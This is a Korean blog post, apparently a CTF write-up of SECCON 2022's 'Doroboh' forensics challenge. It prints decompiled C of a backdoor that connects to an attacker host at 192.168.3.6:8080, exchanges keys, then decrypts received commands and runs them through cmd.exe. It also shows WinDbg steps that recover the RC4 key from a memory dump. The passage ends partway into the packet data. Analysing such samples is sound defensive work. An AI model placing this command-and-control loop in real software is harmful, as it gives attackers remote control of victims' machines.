<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) 2022 Seccon Doroboh writeup" /><meta property="og:locale" content="kr" /><meta name="description" content="대회기간에는 못풀었는데 아쉬워서 풀이 참고해 적어봄" /><meta property="og:description" content="대회기간에는 못풀었는데 아쉬워서 풀이 참고해 적어봄" /><link rel="canonical" href="http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/" /><meta property="og:url" content="http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-05T20:19:36+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) 2022 Seccon Doroboh writeup" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"대회기간에는 못풀었는데 아쉬워서 풀이 참고해 적어봄","url":"http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/","@type":"BlogPosting","headline":"(CTF) 2022 Seccon Doroboh writeup","dateModified":"2022-12-05T20:19:36+09:00","datePublished":"2022-12-05T20:19:36+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/"},"@context":"https://schema.org"}</script><title>(CTF) 2022 Seccon Doroboh writeup | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) 2022 Seccon Doroboh writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) 2022 Seccon Doroboh writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-12-05 20:19:36 +0900" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 5, 2022, 8:19 PM +0900" >Dec 5, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3663 words"> <em>20 min</em> read</span></div></div></div><div class="post-content"><p>대회기간에는 못풀었는데 아쉬워서 풀이 참고해 적어봄</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nx">The</span> <span class="nx">following</span> <span class="nx">diagram</span> <span class="nx">discribes</span> <span class="nx">what</span> <span class="nx">each</span> <span class="nx">file</span> <span class="nx">is</span><span class="p">.</span>
<span class="nx">Do</span> <span class="nx">not</span> <span class="nx">run</span> <span class="nx">araiguma</span><span class="p">.</span><span class="nx">exe</span> <span class="nx">unless</span> <span class="nx">you</span> <span class="nx">fully</span> <span class="nx">understand</span> <span class="nx">the</span> <span class="nx">logic</span><span class="p">.</span>

<span class="o">+--</span> <span class="nx">Victim</span> <span class="nx">Machine</span> <span class="o">--+</span>       <span class="o">+--</span> <span class="nx">Attacker</span> <span class="nx">Machine</span> <span class="o">--+</span>
<span class="o">|</span> <span class="o">+--------------+</span>   <span class="o">|</span>       <span class="o">|</span>   <span class="o">+-------------+</span>    <span class="o">|</span>
<span class="o">|</span> <span class="o">|</span> <span class="nx">araiguma</span><span class="p">.</span><span class="nx">exe</span> <span class="o">|</span><span class="p">&lt;</span><span class="err">-------------</span><span class="p">&gt;</span>| kitsune.exe |    |
| +--------------+   |   ^   |   +-------------+    |
|        ^           |   |   |                      |
+--------|-----------+   |   +----------------------+
         |               |
  Memory |               | Packet
   Dump  |               | Capture
         |               |
  [ araiguma.DMP ] [ network.pcapng ]
</pre></table></code></div></div><p>바이너리 덤프파일, 네트워크 통신기록, 바이너리가 주어진다.</p><p>네트워크 통신기록 → 키교환, 암호화된 명령어 확인 가능</p><p>바이너리 덤프파일 → 메모리에 RC4 키 확인 가능 ( 명령어실행결과(플래그) 가 있어서 언인텐 발생 )</p><h2 id="analysis">analysis<a href="#analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">prepare</span> <span class="n">key</span>
<span class="nf">CryptAcquireContext</span><span class="p">(</span><span class="o">&amp;</span><span class="n">provider</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="s">"Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider"</span><span class="p">,</span> <span class="mi">13</span><span class="n">i64</span><span class="p">,</span> <span class="o">-</span><span class="mi">268435456</span><span class="p">)</span> <span class="p">)</span>
<span class="n">CryptGenKey</span><span class="p">(</span><span class="n">provider</span><span class="p">,</span> <span class="mh">0xAA02u</span><span class="p">,</span> <span class="mh">0x2000041u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">public</span><span class="p">)</span>
<span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">public</span><span class="p">,</span> <span class="mh">0xBu</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v15</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">//KP_P</span>
<span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">public</span><span class="p">,</span> <span class="mh">0xCu</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">//KP_G</span>
<span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">public</span><span class="p">,</span> <span class="mh">0xEu</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">//KP_X</span>
<span class="n">CryptExportKey</span><span class="p">(</span><span class="n">public</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">6u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size_4</span><span class="p">)</span> <span class="c1">// get size </span>
<span class="n">keyblob</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">ProcessHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Size_4</span><span class="p">);</span>
<span class="n">CryptExportKey</span><span class="p">(</span><span class="n">public</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">6u</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">keyblob</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size_4</span><span class="p">)</span> <span class="c1">// get key blob</span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">prepare</span> <span class="n">socket</span> <span class="n">connection</span>
<span class="nf">WSAStartup</span><span class="p">(</span><span class="mi">2u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">);</span>
<span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">v6</span><span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="o">*</span><span class="n">v6</span><span class="p">.</span><span class="n">sa_data</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0x1F90u</span><span class="p">);</span>
<span class="n">inet_pton</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"192.168.3.6"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">.</span><span class="n">sa_data</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="c1">// 192.168.3.6:8080</span>
<span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v6</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">exchange</span> <span class="n">key</span>
<span class="nf">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size_4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">keyblob</span><span class="p">,</span> <span class="n">Size_4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// send size / keyblob</span>
<span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Size</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">v18</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">ProcessHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
<span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v18</span><span class="p">,</span> <span class="n">Size</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>       <span class="c1">// get size / keyblob</span>
<span class="n">CryptImportKey</span><span class="p">(</span><span class="n">provider</span><span class="p">,</span> <span class="n">v18</span><span class="p">,</span> <span class="n">Size</span><span class="p">,</span> <span class="n">public</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">)</span> <span class="c1">// calc key</span>
<span class="n">v5</span> <span class="o">=</span> <span class="mi">26625</span><span class="p">;</span>
<span class="n">CryptSetKeyParam</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">7u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> 
<span class="c1">// Convert ALG_AGREEDKEY_ANY to CALG_RC4.</span>
<span class="n">memset</span><span class="p">(</span><span class="n">v18</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">receive</span> <span class="n">command</span><span class="p">,</span> <span class="n">decrypt</span> <span class="n">and</span> <span class="n">execute</span>
<span class="nf">while</span> <span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="n">cmd</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">ProcessHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">cmd</span> <span class="p">)</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">)</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">HeapFree</span><span class="p">(</span><span class="n">ProcessHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">ShellExecuteA</span><span class="p">(</span><span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="s">"open"</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
  <span class="n">HeapFree</span><span class="p">(</span><span class="n">ProcessHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span> <span class="n">release</span> <span class="n">resources</span>
</pre></table></code></div></div><p>바이너리는 생각보다 간단하다. 키를 준비한 뒤 교환하고 암호화된 명령어를 받아 복호화해서 실행하는 것밖에 없다.</p><p>키를 교환한 뒤, CryptSetKeyParam 함수로 암호화방식을 RC4 로 바꾼다. 그러면 RC4키의 주소는 <code class="language-plaintext highlighter-rouge">key+0x58 (RC4 header) → RC4 header + 0x48</code> 에 저장되어있다. 하지만 디버깅으로 확인해보면, key+0x58 에 있는 주소는 암호화되어있는 것을 확인할 수 있는데, ptr-yudai 선생님의 말에 따르면 credential provider dll 을 분석해보면, 키가 0xA2491D83D96214A0 임을 알 수 있다고 하신다.</p><p>[+] 2022.12.05</p><p><code class="language-plaintext highlighter-rouge">cryptsp.dll.CryptAcquireContextA</code> 에서 xor 하는 부분을 찾으려했는데, 이 함수에서는 찾을 수 없어서 사용하는 부분인 provider 을 사용하는 함수 ( <code class="language-plaintext highlighter-rouge">CryptGenKey</code> ) 를 분석했다.</p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled.png" alt="Untitled" data-proofer-ignore></p><p>hprov+16 → <code class="language-plaintext highlighter-rouge">dessen.dll.CPGenKey</code></p><p>hprov+0xE0 → <code class="language-plaintext highlighter-rouge">xored address</code></p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%201.png" alt="Untitled" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">dessen.dll.CPGenKey</code> 함수에서 xor 상수를 확인할 수 있었다.</p><p>밑에있는 사진은 분석 바이너리처럼 키성생 후 RC4 로 변환하는 것을 디버깅한 과정이다.</p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%202.png" alt="Untitled" data-proofer-ignore></p><blockquote><p>+0x58 에 있는 값과 키를 xor 하면 0x1B832995460 이라는 주소가 나온다.</p></blockquote><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%203.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%204.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%205.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/2022-12-05-doroboh-01b191dc0ea34ed6b0841d80fde8a6f0/Untitled%206.png" alt="Untitled" data-proofer-ignore></p><blockquote><p>RC4 convert 전/후, 각각 사진 2개, 16바이트만 잘라서 사용하는 것을 확인할 수 있다.</p></blockquote><p>헤더의 signature → 0xbadf 임을 알았으니, 바이너리덤프파일을 windbg 로 열어서 검색해보자</p><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="o">||</span><span class="mi">2</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="mo">012</span><span class="o">&gt;</span> <span class="n">s</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="n">L1000000</span> <span class="n">df</span> <span class="n">ba</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f4ba0</span>  <span class="n">df</span> <span class="n">ba</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="n">d0</span> <span class="mi">9</span><span class="n">a</span> <span class="mi">10</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="p">................</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f54f0</span>  <span class="n">df</span> <span class="n">ba</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="n">d0</span> <span class="mi">9</span><span class="n">a</span> <span class="mi">10</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="p">................</span>
<span class="o">||</span><span class="mi">2</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="mo">012</span><span class="o">&gt;</span> <span class="n">dq</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f54f0</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f54f0</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">0000</span><span class="n">badf</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">0010</span><span class="mi">9</span><span class="n">ad0</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5500</span>  <span class="mo">00006</span><span class="mi">801</span><span class="err">`</span><span class="mo">00000001</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">0000001</span><span class="n">b</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5510</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5520</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5530</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00113360</span> <span class="o">&lt;-</span> <span class="n">key</span> <span class="n">pointer</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5540</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000010</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5550</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">000</span><span class="n">f5560</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span>
<span class="o">||</span><span class="mi">2</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="mo">012</span><span class="o">&gt;</span> <span class="n">db</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00113360</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">00113360</span>  <span class="n">f1</span> <span class="n">f5</span> <span class="mi">85</span> <span class="n">a0</span> <span class="n">f3</span> <span class="mi">27</span> <span class="mi">87</span> <span class="n">ad</span><span class="o">-</span><span class="mi">54</span> <span class="n">c0</span> <span class="mi">66</span> <span class="mi">10</span> <span class="n">af</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">3</span><span class="n">a</span> <span class="n">a3</span>  <span class="p">.....</span><span class="err">'</span><span class="p">..</span><span class="n">T</span><span class="p">.</span><span class="n">f</span><span class="p">..</span><span class="o">/:</span><span class="p">.</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">00113370</span>  <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="mi">1</span><span class="n">d</span> <span class="n">f6</span> <span class="mi">89</span> <span class="n">be</span> <span class="mo">00</span> <span class="mi">2</span><span class="n">c</span> <span class="mo">00</span> <span class="mi">88</span>  <span class="p">.............,..</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="mi">80</span>  <span class="mi">4</span><span class="n">c</span> <span class="mo">00</span> <span class="mi">69</span> <span class="mo">00</span> <span class="mi">62</span> <span class="mo">00</span> <span class="mi">72</span> <span class="mo">00</span><span class="o">-</span><span class="mi">80</span> <span class="mi">33</span> <span class="mi">11</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="n">L</span><span class="p">.</span><span class="n">i</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">r</span><span class="p">..</span><span class="mi">3</span><span class="p">......</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="mi">90</span>  <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">80</span><span class="o">-</span><span class="mi">13</span> <span class="n">f6</span> <span class="mi">8</span><span class="n">b</span> <span class="n">be</span> <span class="mo">00</span> <span class="mi">2</span><span class="n">d</span> <span class="mo">00</span> <span class="mi">90</span>  <span class="p">.............</span><span class="o">-</span><span class="p">..</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="n">a0</span>  <span class="mo">01</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="mi">50</span> <span class="mi">77</span> <span class="mi">12</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="p">........</span><span class="n">Pw</span><span class="p">......</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="n">b0</span>  <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="mi">11</span> <span class="n">f6</span> <span class="n">b5</span> <span class="n">be</span> <span class="mo">00</span> <span class="mi">2</span><span class="n">e</span> <span class="mo">00</span> <span class="mi">88</span>  <span class="p">................</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="n">c0</span>  <span class="n">b0</span> <span class="mo">05</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">64</span> <span class="mo">00</span> <span class="mi">2</span><span class="n">e</span> <span class="mo">00</span><span class="o">-</span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="p">....</span><span class="n">d</span><span class="p">...........</span>
<span class="mo">00000000</span><span class="err">`</span><span class="mo">001133</span><span class="n">d0</span>  <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span><span class="o">-</span><span class="mi">17</span> <span class="n">f6</span> <span class="n">b7</span> <span class="n">be</span> <span class="mo">00</span> <span class="mi">2</span><span class="n">f</span> <span class="mo">00</span> <span class="mi">80</span>  <span class="p">.............</span><span class="o">/</span><span class="p">..</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">s 0 L100000 df ba</code></p><p>위 명령어로 0부터 0x1000000 범위에서 0xbadf 를 검색하면 두 개의 결과가 나오고 두 번째 주소에 rc4 키값이 저장되어있는 것을 알 수 있다.</p><hr /><p>위 바이너리에 적힌 아이피로 필터링하여 TCP dump 를 확인해보면 다음과 같은 데이터를 얻을 수 있다.</p><div class="language-cpp highlighter-rouge"><div class="code-header"> <span label-text="Cpp"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="n">BYTE</span> <span class="n">peer0_0</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="cm">/* Packet 74 */</span>                  <span class="c1">// 1. send size</span>
